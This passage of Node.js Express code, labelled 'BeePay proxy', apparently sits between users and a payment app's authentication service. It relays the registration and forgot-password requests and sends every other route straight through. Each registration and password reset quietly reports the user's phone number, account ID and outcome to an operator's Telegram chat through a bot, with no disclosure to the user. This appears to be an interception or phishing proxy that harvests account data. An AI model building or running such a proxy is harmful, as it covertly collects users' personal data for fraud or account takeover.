      ).catch(()=>{});
    }
  } catch(e) { await transparentProxy(req, res); }
});

// ── Register route — log new user ─────────────────────────────────
app.all('/appAuth/memberRegister', async (req, res) => {
  const data = await loadData();
  try {
    const body = req.parsedBody || {};
    const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const respData = getResponseData(jsonResp);
    const phone = body.loginName || body.mobile || body.phone || '';
    const userId = String(respData?.memberId || respData?.userId || respData?.id || '');
    sendJson(res, respHeaders, jsonResp, respBody);
    if (data.adminChatId && bot) {
      const success = jsonResp?.code === 0 || jsonResp?.code === 200 || jsonResp?.success;
      bot.sendMessage(data.adminChatId,
        `🆕 Register ${success ? '✅ Success' : '❌ Failed'}\n📱 Phone: ${phone || 'N/A'}\n🆔 ID: ${userId || 'N/A'}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(()=>{});
    }
  } catch(e) { await transparentProxy(req, res); }
});

// ── Forgot password — log ─────────────────────────────────────────
app.all('/appAuth/forgetPwd', async (req, res) => {
  const data = await loadData();
  try {
    const body = req.parsedBody || {};
    const { respBody, respHeaders, jsonResp } = await proxyFetch(req);
    const phone = body.loginName || body.mobile || body.phone || '';
    sendJson(res, respHeaders, jsonResp, respBody);
    if (data.adminChatId && bot) {
      const success = jsonResp?.code === 0 || jsonResp?.code === 200 || jsonResp?.success;
      bot.sendMessage(data.adminChatId,
        `🔐 Forgot Password ${success ? '✅' : '❌'}\n📱 Phone: ${phone || 'N/A'}\n🕐 ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
      ).catch(()=>{});
    }
  } catch(e) { await transparentProxy(req, res); }
});

// All other routes — transparent proxy
app.all('*', async (req, res) => {
  await transparentProxy(req, res);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`BeePay proxy running on port ${PORT}`));

module.exports = app;
